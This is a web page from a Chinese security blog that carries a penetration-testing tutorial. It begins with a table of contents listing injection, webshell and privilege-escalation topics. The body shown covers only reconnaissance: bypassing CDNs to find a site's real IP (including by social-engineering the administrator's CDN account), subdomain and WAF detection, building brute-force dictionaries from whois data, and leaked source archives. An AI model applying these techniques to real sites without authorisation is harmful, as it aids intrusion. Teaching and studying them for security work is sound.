      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://www.admintony.com/渗透测试知识体系.html"/>





  <title>渗透测试知识体系 | AdminTony's Blog</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?af5255b7770bf4b91fcc15b0139e9637";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">AdminTony's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">学无止境苦与乐</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.admintony.com/渗透测试知识体系.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="AdminTony">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="AdminTony's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">渗透测试知识体系</h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-15T13:00:12-07:00">
                2018-05-15
              </time>
            
			
			
            <i class="fa fa-thumb-tack"></i>
            <font color=7D26CD>置顶</font>
            <span class="post-meta-divider">|</span>
			

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/总结/" itemprop="url" rel="index">
                    <span itemprop="name">总结</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>浏览
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
            </span>
          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  24,077 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  94 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1522472345.5964844.png" alt=""></p>
<a id="more"></a>
<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><!-- TOC -->
<ul>
<li><a href="#目录">目录</a></li>
<li><a href="#信息收集">信息收集</a><ul>
<li><a href="#是否存在cdn">是否存在CDN</a><ul>
<li><a href="#验证是否存在cdn">验证是否存在CDN</a></li>
<li><a href="#绕过cdn查找网站真实ip">绕过CDN查找网站真实IP</a></li>
<li><a href="#绕过cdn防护">绕过CDN防护</a></li>
</ul>
</li>
<li><a href="#服务器信息">服务器信息</a></li>
<li><a href="#子域名收集">子域名收集</a><ul>
<li><a href="#digger-v20">Digger v2.0</a></li>
<li><a href="#layer子域名挖掘机">Layer子域名挖掘机</a></li>
<li><a href="#云悉资产收集">云悉资产收集</a></li>
</ul>
</li>
<li><a href="#whois查询">Whois查询</a></li>
<li><a href="#指纹验证">指纹验证</a></li>
<li><a href="#waf探测">WAF探测</a><ul>
<li><a href="#wafw00f">wafw00f</a></li>
<li><a href="#手工探测waf">手工探测WAF</a></li>
</ul>
</li>
<li><a href="#绝对路径">绝对路径</a></li>
</ul>
</li>
<li><a href="#漏洞发现">漏洞发现</a><ul>
<li><a href="#目录扫描">目录扫描</a></li>
<li><a href="#蜘蛛爬行">蜘蛛爬行</a></li>
<li><a href="#漏洞扫描器">漏洞扫描器</a><ul>
<li><a href="#awvs">AWVS</a></li>
<li><a href="#burpsuite">Burpsuite</a></li>
</ul>
</li>
<li><a href="#根据cms发现漏洞">根据CMS发现漏洞</a></li>
</ul>
</li>
<li><a href="#源代码泄露漏洞">源代码泄露漏洞</a><ul>
<li><a href="#代码压缩包泄露">代码压缩包泄露</a></li>
<li><a href="#svn源代码泄露">SVN源代码泄露</a><ul>
<li><a href="#漏洞成因">漏洞成因</a></li>
<li><a href="#svn源代码泄露两个版本的区别">SVN源代码泄露两个版本的区别</a></li>
<li><a href="#利用工具">利用工具</a></li>
</ul>
</li>
<li><a href="#git源码泄露">git源码泄露</a></li>
<li><a href="#swp源码泄露">swp源码泄露</a></li>
<li><a href="#数据库外泄">数据库外泄</a></li>
<li><a href="#web-infwebxml泄露">WEB-INF/web.xml泄露</a><ul>
<li><a href="#web-inf介绍">WEB-INF介绍</a></li>
<li><a href="#漏洞检测和利用">漏洞检测和利用</a></li>
<li><a href="#cvs泄露">CVS泄露</a></li>
</ul>
</li>
<li><a href="#ds_store文件泄漏">DS_Store文件泄漏</a><ul>
<li><a href="#漏洞成因-1">漏洞成因</a></li>
<li><a href="#漏洞利用">漏洞利用</a></li>
</ul>
</li>
<li><a href="#bazaarbzr">Bazaar/bzr</a></li>
</ul>
</li>
<li><a href="#sql注入">SQL注入</a><ul>
<li><a href="#sql注入产生原理">SQL注入产生原理</a></li>
<li><a href="#sql注入分类">SQL注入分类</a><ul>
<li><a href="#根据数据库类型分类">根据数据库类型分类</a><ul>
<li><a href="#access注入">ACCESS注入</a></li>
<li><a href="#mysql注入">MySQL注入</a></li>
<li><a href="#mssql注入">MSSQL注入</a></li>
<li><a href="#oracle注入">Oracle注入</a></li>
</ul>
</li>
<li><a href="#根据注入点权限划分">根据注入点权限划分</a><ul>
<li><a href="#普通权限注入">普通权限注入</a></li>
<li><a href="#高权限注入">高权限注入</a></li>
</ul>
</li>
<li><a href="#根据页面回显不同分类">根据页面回显不同分类</a><ul>
<li><a href="#普通注入">普通注入</a></li>
<li><a href="#报错注入">报错注入</a></li>
<li><a href="#盲注-基于布尔的盲注">盲注-基于布尔的盲注</a></li>
<li><a href="#盲注-基于时间的盲注">盲注-基于时间的盲注</a></li>
</ul>
</li>
<li><a href="#根据程序sql语句分类">根据程序SQL语句分类</a><ul>
<li><a href="#insert注入">INSERT注入</a><ul>
<li><a href="#检测方法">检测方法</a></li>
<li><a href="#报错法">报错法</a></li>
<li><a href="#闭合语句法">闭合语句法</a></li>
</ul>
</li>
<li><a href="#update注入">UPDATE注入</a><ul>
<li><a href="#检测方法-1">检测方法</a></li>
<li><a href="#报错法-1">报错法</a></li>
<li><a href="#闭合语句法-1">闭合语句法</a></li>
</ul>
</li>
<li><a href="#delete注入">DELETE注入</a></li>
</ul>
</li>
<li><a href="#根据提交方式分类">根据提交方式分类</a><ul>
<li><a href="#get注入">GET注入</a></li>
<li><a href="#post注入">POST注入</a></li>
<li><a href="#cookie注入">COOKIE注入</a></li>
<li><a href="#http头注入">HTTP头注入</a></li>
</ul>
</li>
<li><a href="#根据闭合方式分类">根据闭合方式分类</a><ul>
<li><a href="#数字型注入">数字型注入</a></li>
<li><a href="#字符型注入">字符型注入</a></li>
<li><a href="#搜索型注入">搜索型注入</a></li>
</ul>
</li>
<li><a href="#宽字节注入">宽字节注入</a></li>
<li><a href="#二次注入">二次注入</a></li>
<li><a href="#xxe注入">XXE注入</a></li>
</ul>
</li>
<li><a href="#找后台的方法">找后台的方法</a><ul>
<li><a href="#目录扫描-1">目录扫描</a></li>
<li><a href="#蜘蛛爬行-1">蜘蛛爬行</a></li>
<li><a href="#google黑客">google黑客</a></li>
<li><a href="#遗留文件">遗留文件</a></li>
<li><a href="#子域名">子域名</a></li>
<li><a href="#端口">端口</a></li>
<li><a href="#根据规律猜测">根据规律猜测</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#phpmyadmin与数据库外联">phpMyAdmin与数据库外联</a><ul>
<li><a href="#介绍">介绍</a></li>
<li><a href="#读文件">读文件</a><ul>
<li><a href="#load_file函数">load_file函数</a></li>
<li><a href="#load-data语句">LOAD DATA语句</a></li>
</ul>
</li>
<li><a href="#写文件">写文件</a><ul>
<li><a href="#into-oufile-子句">into oufile 子句</a></li>
<li><a href="#设置日志写文件">设置日志写文件</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#getshell">GETSHELL</a><ul>
<li><a href="#webshell">WEBSHELL</a><ul>
<li><a href="#webshell的介绍">WEBSHELL的介绍</a></li>
<li><a href="#webshell管理工具-菜刀">WEBSHELL管理工具-菜刀</a></li>
<li><a href="#图片马">图片马</a></li>
</ul>
</li>
<li><a href="#上传漏洞">上传漏洞</a><ul>
<li><a href="#解析漏洞">解析漏洞</a><ul>
<li><a href="#iis60解析漏洞">IIS6.0解析漏洞</a></li>
<li><a href="#apache解析漏洞">Apache解析漏洞</a></li>
<li><a href="#nginx解析漏洞">Nginx解析漏洞</a></li>
<li><a href="#cgi解析漏洞">CGI解析漏洞</a></li>
</ul>
</li>
<li><a href="#任意文件上传">任意文件上传</a></li>
<li><a href="#前端js验证">前端JS验证</a></li>
<li><a href="#服务端拓展名验证">服务端拓展名验证</a></li>
<li><a href="#mime验证">MIME验证</a></li>
<li><a href="#上传内容验证">上传内容验证</a></li>
<li><a href="#00截断">00截断</a></li>
<li><a href="#双文件上传">双文件上传</a></li>
</ul>
</li>
<li><a href="#数据库备份">数据库备份</a></li>
<li><a href="#插配置文件">插配置文件</a></li>
<li><a href="#编辑器漏洞">编辑器漏洞</a><ul>
<li><a href="#ewebeditor">EwebEditor</a></li>
<li><a href="#fckeditor">FCKeditor</a><ul>
<li><a href="#查看版本">查看版本</a></li>
<li><a href="#爆绝对路径">爆绝对路径</a></li>
<li><a href="#遍历目录">遍历目录</a></li>
<li><a href="#常用的上传地址">常用的上传地址</a></li>
<li><a href="#突破建立文件夹">突破建立文件夹</a></li>
<li><a href="#fck上传getshell">FCK上传GETSHELL</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#修改模板文件">修改模板文件</a></li>
<li><a href="#代码执行">代码执行</a><ul>
<li><a href="#测试代码">测试代码</a></li>
<li><a href="#执行任意代码">执行任意代码</a></li>
<li><a href="#构造webshell">构造WEBSHELL</a></li>
<li><a href="#写文件-1">写文件</a></li>
<li><a href="#读文件-1">读文件</a></li>
<li><a href="#代码执行函数">代码执行函数</a></li>
</ul>
</li>
<li><a href="#命令执行">命令执行</a><ul>
<li><a href="#测试环境">测试环境</a></li>
<li><a href="#执行任意命令">执行任意命令</a></li>
<li><a href="#写shell">写SHELL</a></li>
<li><a href="#cmd下载文件">CMD下载文件</a></li>
<li><a href="#命令执行函数">命令执行函数</a></li>
</ul>
</li>
<li><a href="#文件包含">文件包含</a><ul>
<li><a href="#本地文件包含lfi">本地文件包含LFI</a><ul>
<li><a href="#配合上传利用">配合上传利用</a></li>
<li><a href="#配合apache日志利用">配合Apache日志利用</a></li>
</ul>
</li>
<li><a href="#远程文件包含rfi">远程文件包含RFI</a></li>
<li><a href="#截断包含">截断包含</a><ul>
<li><a href="#00截断-1">00截断</a></li>
<li><a href="#和截断">.和/截断</a></li>
<li><a href="#伪截断">?伪截断</a></li>
</ul>
</li>
<li><a href="#php伪协议">PHP伪协议</a><ul>
<li><a href="#phpinput">php://input</a></li>
<li><a href="#datatextplain">data:text/plain</a></li>
<li><a href="#phpfilter">php://filter</a></li>
<li><a href="#phar">phar://</a></li>
<li><a href="#file">file://</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#windows服务器权限提升">Windows服务器权限提升</a><ul>
<li><a href="#提权常用的系统命令">提权常用的系统命令</a></li>
<li><a href="#提权前的准备工作">提权前的准备工作</a><ul>
<li><a href="#信息收集-1">信息收集</a></li>
<li><a href="#攻击方案制定">攻击方案制定</a></li>
</ul>
</li>
<li><a href="#缓冲区溢出">缓冲区溢出</a><ul>
<li><a href="#本地溢出">本地溢出</a></li>
<li><a href="#远程溢出">远程溢出</a><ul>
<li><a href="#ms17010">MS17010</a></li>
<li><a href="#iis6远程代码执行">IIS6远程代码执行</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#数据库提权">数据库提权</a><ul>
<li><a href="#mysql提权">MySQL提权</a><ul>
<li><a href="#udf提权">UDF提权</a></li>
<li><a href="#mof提权">MOF提权</a></li>
<li><a href="#启动项提权">启动项提权</a></li>
</ul>
</li>
<li><a href="#mssql提权">MSSQL提权</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- /TOC -->
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>&emsp;&emsp;信息收集的主要目的是为了制定下一步的攻击方案。</p>
<p>&emsp;&emsp;那信息收集要收集哪些信息？</p>
<h2 id="是否存在CDN"><a href="#是否存在CDN" class="headerlink" title="是否存在CDN"></a>是否存在CDN</h2><h3 id="验证是否存在CDN"><a href="#验证是否存在CDN" class="headerlink" title="验证是否存在CDN"></a>验证是否存在CDN</h3><ul>
<li>方法1 </li>
</ul>
<p>&emsp;&emsp;很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://ping.chinaz.com/</span><br><span class="line">http://ping.aizhan.com/</span><br><span class="line">http://ce.cloud.360.cn/</span><br></pre></td></tr></table></figure>
<ul>
<li>方法2</li>
</ul>
<p>&emsp;&emsp;试用nslookup进行检测，如果返回域名解析对应多个IP，那么多半是试用了CDN.</p>
<p>&emsp;&emsp;有CDN的示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;nslookup www.163.com</span><br><span class="line">服务器:  192.168.1.1</span><br><span class="line">Address:  192.168.1.1</span><br><span class="line"></span><br><span class="line">非权威应答:</span><br><span class="line">名称:    163.xdwscache.ourglb0.com</span><br><span class="line">Addresses:  175.154.186.43</span><br><span class="line">          119.6.226.156</span><br><span class="line">Aliases:  www.163.com</span><br><span class="line">          www.163.com.lxdns.com</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;无CDN的示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;nslookup www.swust.edu.cn</span><br><span class="line">服务器:  192.168.1.1</span><br><span class="line">Address:  192.168.1.1</span><br><span class="line"></span><br><span class="line">非权威应答:</span><br><span class="line">名称:    www.swust.edu.cn</span><br><span class="line">Address:  220.166.52.101</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;里面一些名词的解释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">名称 ：这个名称指的是主机规范名</span><br><span class="line">Addresses ： 域名对应的解析IP</span><br><span class="line">Aliases : 别名，比如 www.baidu.com就是百度的别名</span><br></pre></td></tr></table></figure>
<ul>
<li>方法3</li>
</ul>
<p>&emsp;&emsp;在线工具查看是否存在CDN，可以参考以下站点:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.cdnplanet.com/tools/cdnfinder/</span><br><span class="line">http://www.ipip.net/ip.html</span><br></pre></td></tr></table></figure>
<h3 id="绕过CDN查找网站真实IP"><a href="#绕过CDN查找网站真实IP" class="headerlink" title="绕过CDN查找网站真实IP"></a>绕过CDN查找网站真实IP</h3><ul>
<li>1.查询历史DNS记录</li>
</ul>
<p>&emsp;&emsp;查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://dnsdb.io/zh-cn/</span><br><span class="line"></span><br><span class="line">https://x.threatbook.cn/</span><br><span class="line"></span><br><span class="line">http://toolbar.netcraft.com/site_report?url=</span><br><span class="line"></span><br><span class="line">http://viewdns.info/</span><br></pre></td></tr></table></figure>
<ul>
<li>2.查询子域名</li>
</ul>
<p>&emsp;&emsp;有可能有些站长只给主站或流量大的子域名做了CDN,而很多子域名都是和主站在同一台服务器上，或者 C段中，这样可以通过子域名来辅助找到网站真实IP</p>
<ul>
<li>3.利用网站漏洞</li>
</ul>
<p>&emsp;&emsp;fopen 、 file_get_contents 这些函数，将文件参数改成自己服务器的IP，让对方服务器主动连接我们，然后从日志找到对方真实IP</p>
<ul>
<li>4.目标敏感文件泄露</li>
</ul>
<p>&emsp;&emsp;比如PHPinfo这类的探针</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1522474836.8897252.png" alt=""></p>
<ul>
<li>5.从CDN下手</li>
</ul>
<p>&emsp;&emsp;使用社工等手段拿到目标管理员在CDN的账号，然后即可找到真实IP</p>
<ul>
<li>6.利用Zgrab绕CDN找真实IP</li>
</ul>
<p>&emsp;&emsp;<a href="https://www.t00ls.net/viewthread.php?tid=40631" target="_blank" rel="noopener">利用Zgrab绕CDN找真实IP</a></p>
<ul>
<li>7.邮件</li>
</ul>
<p>&emsp;&emsp;在一些站点上注册用户会给发邮件，从邮件中可以找到该站点的真实IP</p>
<h3 id="绕过CDN防护"><a href="#绕过CDN防护" class="headerlink" title="绕过CDN防护"></a>绕过CDN防护</h3><p>&emsp;&emsp;当我们通过上面的方法拿到真实的IP以后，如何绕过CDN带来的防护呢？</p>
<p>&emsp;&emsp;修改hosts文件，添加域名对应IP</p>
<h2 id="服务器信息"><a href="#服务器信息" class="headerlink" title="服务器信息"></a>服务器信息</h2><ul>
<li><p>IP地址，结合上面的CDN绕过，获取到IP</p>
</li>
<li><p>服务器的系统类型 (windows、linux(Ubuntu、ContentOS))</p>
</li>
<li><p>支持的脚本类型 (asp、aspx、php、jsp)</p>
</li>
<li><p>Web容器 (apache 、IIS 、nginx)</p>
</li>
<li><p>开放端口情况 (21,22,80,1433,5900,3306,3389,8080,43958)</p>
</li>
<li><p>绝对路径 (报错页面显示、探针显示)</p>
</li>
</ul>
<h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><p>&emsp;&emsp;这里主要提到两款子域名收集的工具 和 一个资产收集的平台</p>
<h3 id="Digger-v2-0"><a href="#Digger-v2-0" class="headerlink" title="Digger v2.0"></a>Digger v2.0</h3><p>&emsp;&emsp;Digger 是我个人编写的一款子域名收集的工具，主要从百度进行子域名爬取，并验证子域名是否可以访问。具体请看 <a href="http://admintony.com/2017/12/22/子域名发现工具/" target="_blank" rel="noopener">子域名发现工具</a></p>
<h3 id="Layer子域名挖掘机"><a href="#Layer子域名挖掘机" class="headerlink" title="Layer子域名挖掘机"></a>Layer子域名挖掘机</h3><p>&emsp;&emsp;Layer 是Seay法师写的一款，以暴力枚举为主的子域名收集工具。<a href="https://www.waitalone.cn/layer-subdomain-excavator.html" target="_blank" rel="noopener">Layer子域名挖掘机V2.1</a></p>
<p>&emsp;&emsp;两款工具对比，如何选择呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">两款工具各有优点，Digger在目标站点被百度大量收录的情况下使用，效果更加，而且相比于Layer会快很多</span><br><span class="line"></span><br><span class="line">Layer 在目标站点被百度收录较少的时候使用效果不错，但是有一个不太好的地方就是，Layer把生成的子域名字符</span><br><span class="line">串会加载到内存中，导致程序占用大量内存而变得很卡。(很多老工具都有这个问题，比如御剑前辈的后台扫描)</span><br></pre></td></tr></table></figure>
<h3 id="云悉资产收集"><a href="#云悉资产收集" class="headerlink" title="云悉资产收集"></a>云悉资产收集</h3><p>&emsp;&emsp;云悉是一个很棒的在线分布式资产收集平台，具体可以到 <a href="http://www.yunsee.cn" target="_blank" rel="noopener">http://www.yunsee.cn</a> 了解一下。</p>
<h2 id="Whois查询"><a href="#Whois查询" class="headerlink" title="Whois查询"></a>Whois查询</h2><p>&emsp;&emsp;用站长工具whois查询域名的所有者情况和注册邮箱，可以根据注册者的信息生成爆破字典。</p>
<h2 id="指纹验证"><a href="#指纹验证" class="headerlink" title="指纹验证"></a>指纹验证</h2><p>&emsp;&emsp;指纹验证是识别目标站点采用了什么CMS搭建，然后根据CMS制定攻击方案</p>
<p>&emsp;&emsp;指纹验证工具有两个：</p>
<ul>
<li>御剑前辈的指纹识别系统</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1522476880.5123963.png" alt=""></p>
<ul>
<li>云悉的指纹识别</li>
</ul>
<h2 id="WAF探测"><a href="#WAF探测" class="headerlink" title="WAF探测"></a>WAF探测</h2><p>&emsp;&emsp;进行WAF探测的目的是为了防止在有WAF的情况下还进行大规模的扫描导致被封IP。</p>
<h3 id="wafw00f"><a href="#wafw00f" class="headerlink" title="wafw00f"></a>wafw00f</h3><p>&emsp;&emsp;WAF探测常用的工具是 kali下的 WafW00f , 对国外的waf探测效果比较好，对国内的waf不太敏感。具体还是要自己手工进行探测。</p>
<h3 id="手工探测WAF"><a href="#手工探测WAF" class="headerlink" title="手工探测WAF"></a>手工探测WAF</h3><ul>
<li><p>护卫神 ，在有护卫神的站点上会发现HTML中会有\&lt;hws>\&lt;\hws>这样的标签</p>
</li>
<li><p>安全狗 ，随便输入一个目标站点不存在的页面，它便会跳转到安全狗的404界面</p>
</li>
<li><p>云Waf , 比如腾讯云、阿里云，如果发现目标主机IP是这两个云产品的，一般情况下，该目标会受到腾讯云、阿里云的保护。此外云waf还有百度的加速乐等..</p>
</li>
</ul>
<p>&emsp;&emsp;阿里在本月(2018.03)发布了通知，云防护要另收费了。</p>
<h2 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h2><p>&emsp;&emsp;绝对路径探测也是信息收集的一部分，在后面的渗透中很多地方需要用到据对路径来进行下一步渗透。</p>
<p>&emsp;&emsp;绝对路径的探测方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.site:域名 warning # google or baidu</span><br><span class="line">2.报错显示,比如注入点报错就可以显示出来</span><br><span class="line">3.phpinfo中泄露</span><br></pre></td></tr></table></figure>
<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>&emsp;&emsp;目录扫描的目的是为了探测目标的目录情况，从而分析目标的CMS情况、敏感信息泄露情况 以及 一个大体的站点地图。</p>
<p>&emsp;&emsp;这里推荐用御剑前辈的后台扫描器，如果有时间的话，笔者也会写一款后台扫描器，以修复御剑前辈扫描器的不足之处。</p>
<h2 id="蜘蛛爬行"><a href="#蜘蛛爬行" class="headerlink" title="蜘蛛爬行"></a>蜘蛛爬行</h2><p>&emsp;&emsp;蜘蛛爬行和目录扫描的目的差不多，都是为了帮助用户建立一个大概的站点地图，但是两者采用的方法却不同，目录扫描是根据字典进行枚举，而蜘蛛爬行则是从站点的链接中获取站点的目录情况。</p>
<p>&emsp;&emsp;蜘蛛爬行相较于目录扫描的最大优点在于，能爬出苛刻的目录，比如web后台的目录是bnbndmw/login.php，而bnbndmw是比较苛刻的字符很难有字典包含这个字符，而这个链接又存在于站点的其他html链接中，就会被蜘蛛发现，从而收集到。</p>
<p>&emsp;&emsp;蜘蛛爬行在常用的漏洞扫描器中 以及 Burpsuite里面都具备。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1522478660.9754488.png" alt=""></p>
<h2 id="漏洞扫描器"><a href="#漏洞扫描器" class="headerlink" title="漏洞扫描器"></a>漏洞扫描器</h2><h3 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h3><p>&emsp;&emsp;awvs是一款很优秀的扫描器，它代替我们进行探测，从而节省人力地发现站点漏洞，并生成报告的一款漏洞扫描器。</p>
<p>&emsp;&emsp;不仅如此，awvs也是一个用户界面简单，操作简单的的扫描器。它也支持多站点同时进行漏洞扫描。</p>
<p>&emsp;&emsp;下图就是我用AWVS 11 进行漏洞扫描的一个截图</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1522478179.2448184.png" alt=""></p>
<h3 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h3><p>&emsp;&emsp;Burpsuite不止是一个抓包分析工具，他还具备爬虫、被动漏洞扫描、主动漏洞扫描、自动化攻击、重放等功能。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1522478487.6488864.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1522478560.5988884.png" alt=""></p>
<p>&emsp;&emsp;漏洞扫描器的种类很多，这两款是笔者常用的两款。</p>
<h2 id="根据CMS发现漏洞"><a href="#根据CMS发现漏洞" class="headerlink" title="根据CMS发现漏洞"></a>根据CMS发现漏洞</h2><p>&emsp;&emsp;在已知对方使用的CMS时，我们可以去百度该CMS存在哪些漏洞，然后用已知的漏洞进行测试。</p>
<p>&emsp;&emsp;比如：目标站点使用的是PHPCMS V9,那么我们去百度PHPCMS V9的漏洞：</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201803/1522478929.948256.png" alt=""></p>
<p>&emsp;&emsp;然后我可以用百度到的这些漏洞详情去测试目标站点是否存在该漏洞。</p>
<h1 id="源代码泄露漏洞"><a href="#源代码泄露漏洞" class="headerlink" title="源代码泄露漏洞"></a>源代码泄露漏洞</h1><h2 id="代码压缩包泄露"><a href="#代码压缩包泄露" class="headerlink" title="代码压缩包泄露"></a>代码压缩包泄露</h2><p>&emsp;&emsp;有些站点的管理员将源码备份成压缩包的格式，却放在了Web目录下，攻击者访问该压缩包的时候就会下载该压缩包。</p>
<p>&emsp;&emsp;常见后缀 ： .zip .rar .tar.gz .7z</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201804/1523634993.3976681.png" alt=""></p>
